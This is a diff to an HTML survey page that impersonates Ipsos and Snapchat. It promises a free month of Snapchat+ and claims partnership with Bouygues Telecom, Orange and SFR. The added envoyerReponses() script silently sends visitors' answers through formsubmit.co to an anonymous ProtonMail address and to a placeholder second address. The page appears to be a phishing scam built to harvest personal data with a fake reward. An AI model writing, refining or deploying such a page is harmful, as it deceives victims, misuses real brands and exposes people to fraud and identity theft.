@@ -3,8 +3,29 @@
 <head>
 <meta charset="UTF-8">
 <title>Sondage|Ipsos</title>
+
+<!-- Police Inter -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
 <style>
-body { font-family: Arial; background:#f4f6f9; margin:0; font-size:20px; }
+body { 
+    font-family: 'Inter', sans-serif; 
+    background:#f4f6f9; 
+    margin:0; 
+    font-size:20px; 
+}
+
+/* RESPONSIVE */
+@media (max-width: 600px) {
+    .box {
+        margin:20px;
+        padding:25px;
+    }
+    h2 { font-size:26px; }
+    p { font-size:20px; }
+    button { font-size:20px; padding:12px 20px; }
+    #partenariat { font-size:20px; }
+}
 
 /* HEADER AVEC LOGO */
 .header {
@@ -32,6 +53,16 @@ body { font-family: Arial; background:#f4f6f9; margin:0; font-size:20px; }
     position:absolute;
     left:30px;
 }
+/* LOGO PERMANENT EN HAUT À DROITE */
+.logo-fixed {
+    position: fixed;
+    top: 15px;
+    right: 15px;
+    height: 45px;
+    z-index: 9999;
+    cursor: pointer;
+}
+
 
 /* CONTENU CENTRAL */
 .box {
@@ -61,8 +92,6 @@ button:disabled {
     cursor:not-allowed;
 }
 
-.option { margin:10px 0; font-size:22px; }
-
 /* BARRE DE PROGRESSION */
 .progress-container {
     width:100%;
@@ -79,9 +108,17 @@ button:disabled {
     background:#0078d4;
     transition: width 0.3s ease;
 }
+
+/* PARTENARIAT */
+#partenariat {
+    display:none;
+    text-align:center;
+    font-size:26px;
+    margin-top:40px;
+}
 </style>
 </head>
-<body>
+<body><img src="SnapchatLogo.png" class="logo-fixed" alt="Logo">
 
 <div class="header">
     <a href="index.html" onclick="return confirmerRetour();">
@@ -91,16 +128,14 @@ button:disabled {
     <div class="header-text"><h2>Ipsos sondage</h2></div>
 </div>
 
-<!-- ÉCRAN INTERMÉDIAIRE -->
+<!-- ÉCRAN INTRO -->
 <div class="box" id="intro">
     <h2>Sondage éphémère</h2>
-    <p>
-     Après avoir répondu à ce sondage, VOUS AUREZ SNAPCHAT + 🎁
-    </p>
+    <p>Après avoir répondu à ce sondage, VOUS AUREZ SNAPCHAT + 🎁</p>
     <button onclick="demarrerSondage()">Commencer</button>
 </div>
 
-<!-- PAGE INTERMÉDIAIRE APRÈS QUESTION 3 -->
+<!-- PAGE INTERMÉDIAIRE -->
 <div class="box" id="intermediaire" style="display:none;">
     <h2>Merci pour vos réponses à ce sondage express !</h2>
     <p>Dans un instant, vous pourrez bénéficier de Snapchat+ pendant 1 mois !<br>
@@ -120,12 +155,17 @@ button:disabled {
     <button onclick="suivant()">Suivant</button>
 </div>
 
+<!-- PARTENARIAT (affiché uniquement aux questions 4,5,6) -->
+<div id="partenariat">
+    <div><strong>Snapchat + Ipsos sondage</strong></div>
+    <div>En partenariat avec Bouygues Telecom, Orange et SFR</div>
+</div>
+
 <script>
 function confirmerRetour() {
     return confirm("Attention : si vous retournez à l'accueil, le sondage en cours sera perdu.");
 }
 
-/* INTRODUCTION → LANCER LE SONDAGE */
 function demarrerSondage() {
     document.getElementById("intro").style.display = "none";
     document.getElementById("sondage").style.display = "block";
@@ -146,10 +186,8 @@ let questions = [
 
 let i = 0;
 
-/* AFFICHAGE DU TITRE */
 document.getElementById("titre").textContent = titre;
 
-/* FONCTION POUR AFFICHER UNE QUESTION */
 function afficherQuestion() {
     let q = questions[i];
     document.getElementById("question").textContent = q.text;
@@ -161,11 +199,13 @@ function afficherQuestion() {
         zone.innerHTML = `<input id="champ" type="text" placeholder="${q.placeholder || ''}" oninput="verifierChamp()" style="width:100%; font-size:22px; padding:10px;">`;
     }
 
+    // Afficher partenariat uniquement aux questions 4, 5, 6
+    document.getElementById("partenariat").style.display = (i >= 3 && i <= 5) ? "block" : "none";
+
     document.querySelector("#sondage button").disabled = true;
 
     updateProgress();
 }
-
 /* ACTIVER/DÉSACTIVER LE BOUTON */
 function verifierChamp() {
     let input = document.getElementById("champ");
@@ -179,7 +219,6 @@ function updateProgress() {
     document.getElementById("progressBar").style.width = progress + "%";
 }
 
-/* PASSER A LA QUESTION SUIVANTE */
 function suivant() {
     let q = questions[i];
 
@@ -216,10 +255,11 @@ function suivant() {
         "Un message vous sera envoyé dans les prochaines 24 heures pour vous informer " +
         "si vous avez remporté Snapchat+.<br><br>" +
         "À bientôt chez Ipsos !</h2>";
+
+        envoyerReponses(); // 🔥 Envoi automatique à la fin
     }
 }
 
-/* CONTINUER APRÈS LA PAGE INTERMÉDIAIRE */
 function continuer() {
     document.getElementById("intermediaire").style.display = "none";
     document.getElementById("sondage").style.display = "block";
@@ -227,9 +267,44 @@ function continuer() {
 }
 </script>
 
-<br><br><br><br>
-<br><h4><center>Snapchat + Ipsos sondage</center></h4>
-<br> <h5><center>En partenariat avec Bouygues Telecom,Orange et SFR</center></h5>
+<!-- PARTENARIAT (déjà stylé + responsive) -->
+<div id="partenariat">
+    <div><strong>Snapchat + Ipsos sondage</strong></div>
+    <div>En partenariat avec Bouygues Telecom, Orange et SFR</div>
+</div>
+
+<!-- SCRIPT D’ENVOI VERS 2 MAILS -->
+<script>
+function envoyerReponses() {
+    let data = {};
+
+    // Récupérer toutes les réponses
+    questions.forEach((q, index) => {
+        let input = document.querySelector("#reponses input");
+        data[q.text] = input ? input.value : "";
+    });
+
+    // Convertir en FormData
+    let formData = new FormData();
+    for (let key in data) {
+        formData.append(key, data[key]);
+    }
+
+    // Envoi vers email 1
+    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
+        method: "POST",
+        body: formData
+    });
+
+    // Envoi vers email 2
+    fetch("https://formsubmit.co/MAIL2", {
+        method: "POST",
+        body: formData
+    });
+
+    alert("Merci ! Vos réponses ont été envoyées.");
+}
+</script>
 
 </body>
 </html>
